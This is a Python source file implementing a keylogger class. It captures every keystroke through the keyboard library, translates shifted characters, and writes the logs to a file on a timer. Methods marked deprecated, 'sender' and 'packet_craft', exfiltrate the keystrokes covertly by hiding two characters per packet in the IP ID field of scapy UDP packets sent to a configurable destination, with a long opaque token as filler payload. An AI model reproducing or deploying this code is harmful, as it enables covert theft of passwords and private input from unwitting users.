from threading import Timer

import keyboard
from scapy.all import *
from scapy.layers.inet import IP, UDP


class keylog:
    def __init__(self, time, file, dest, port):
        self.file = file
        self.dest = dest
        open(file, "w+")
        self.time = time
        self.log = ""
        self.port = port
        self.on = False

    def start(self):
        if not self.on:
            self.on = True
            self.__report()
            thread = Thread(target=self.__loop)
            thread.daemon = True
            thread.start()
            return True
        else:
            return False

    def stop(self):
        if self.on:
            self.on = False
            return True
        return False

    def __loop(self):
        key = keyboard.read_key()
        if self.on:
            self.__input(key)
            self.__loop()

    def __input(self, name):
        if not self.on:
            return
        if keyboard.is_pressed(name):
            return
        if len(name) > 1:
            match name:
                case "enter":
                    name = "\n"
                case "space":
                    name = " "
                case _:
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"

        elif keyboard.is_pressed("shift"):
            name = self.__capitalize(name)
        self.log += name
        # self.report()

    def __report(self):
        if self.log:
            file = open(self.file, "a+")
            print(self.log, file=file)
            # print(f"{self.log}")
        # x = threading.Thread(target=self.sender)
        # x.daemon = True
        # x.start()
        if self.on:
            self.log = ""
            t = Timer(interval=self.time, function=self.__report)
            t.daemon = True
            t.start()

    @staticmethod
    def __capitalize(name):
        match name:
            case "1":
                return "!"
            case "2":
                return "@"
            case "3":
                return "#"
            case "4":
                return "$"
            case "5":
                return "%"
            case "6":
                return "^"
            case "7":
                return "&"
            case "8":
                return "*"
            case "9":
                return "("
            case "0":
                return ")"
            case "-":
                return "_"
            case "=":
                return "+"
            case "[":
                return "{"
            case "]":
                return "}"
            case r'\'':
                return "|"
            case ";":
                return ":"
            case "'":
                return r'"'
            case ",":
                return "<"
            case ".":
                return ">"
            case "/":
                return "?"
            case "`":
                return "~"
            case _:
                return name.upper()

    # DEPRECIATED
    def sender(self):
        data = self.log
        tmp1 = 'a'
        count = 0
        for char in data:
            if count == 0:
                tmp1 = char
                count = 1
            else:
                dgram = self.packet_craft(tmp1, char)
                send(dgram, verbose=0)
                count = 0
                time.sleep(5)

    # DEPRECIATED
    def packet_craft(self, char, char2):
        dchar = ord(char)
        dchar1 = ord(char2)
        s = struct.pack('bb', dchar, dchar1)
        dgram = IP(dst=self.dest, id=int.from_bytes(s, "little")) / UDP(
            dport=self.port) / "b'gAAAAABjR1206eSGUNO5pc1EyraqxlItawbfAuQiYZOfKIu7D3fqDSJ47Aq4GDY3ZusyDRL1ul05EIIgLmUix6pCXpdbhMpn0Ny79T81krfzD-e5uqIyCrMa4hrvHhdsqH6Wq4_CByVPpmUFYXh0rUD3UdwATJ69At89Z8lWH1BVGb5ObThw4jEjiOTfEdGjGKn_IDoztSRIfykV5ttAPXWMKOyZHPiHRe5kBBLVMjoK-tDHedIlZbQCwteLt2SWFHY9-PAjKZ6nTb3TmjeRVe-Bxk4yICl7S0V4gbQozHg4NDonHTsntCp11DJlATRJoHRDEMNCDUggorMaoTeFWLQsJ0Ob0QDOgHzyv0wGZmC6jYKROcKYXIJ7NTnsqMzy579gWxXnkRQjKSCdkK_ZygVROnNkZftxD27cwd0VTkn0W5UjqU2klg7b4KQu8HtnWSn1f4151oRl8xopHaNBf1q3I7a1b3ONb4UFqtmuUq7KAO0LtximuhIrmNjqdUhag3kbcDxRD-xs7oXTUk1bkqvpVO4f3KeYpQi_5SEnrYzDhge7JFrSKx4ZRj4GAlYMkEHykFOFMVkD5wM5pUlDD3M7Vj0iH-MKeE6IfKjeGN1CE-tZvw5CaJvRoX8k2leaPGb_V_nctS9N-ziDVlPN0lcUgievsDvcuvumtgzZ89erLMZ6FiMKKchWAnWEqet46OrWz7Lqn4eswwhMlQzgyLIgAK8qhhrIoPuxhVI5ylSOaqZnHKn7UQXniS0weHOvBQBEGhJQN-mQ6NEVswfvBE7-nMKMEj7oHv0cbnqItxH3QImPGI37GzFZy3bRvLANFrI8LUaSSU4pgCfu06iXi828gu63rsOQV8HC32mbtxejIMZDoPB1gHjHIZOJSzGmfRC8wUQMTn9Awq7SrGuc5TagD7M8yvLgE2xae3yZtxCmXIqOWgl9u0jW9bk8qP8CI3Cyb1DBzKLePs1Weo3tuMsZAzrmv6SF-j82hDDmshH55f1R61YdlkU_GR7a0mxZb4Uk0uZCZ5mQ7poAxlk1wwBZMhgZpchJMBPnjYsFoY78jyVck1WFIYLSBEg9u-P9nxXzjWALdFQ_yQOeEDOiVs_jwueQMA0HV5AGENvBf9aLNdudGgtC1rLxhCBvBUE3aFooltr4Yb708nYxxLrCpx-dEDuCTISE8c5OgWk0Ay7QUt1XFis41rPsqpTUEfiLKDTB9-yvLvg4yCyrIG3zYazC70k6iWsRgg=='"
        return dgram
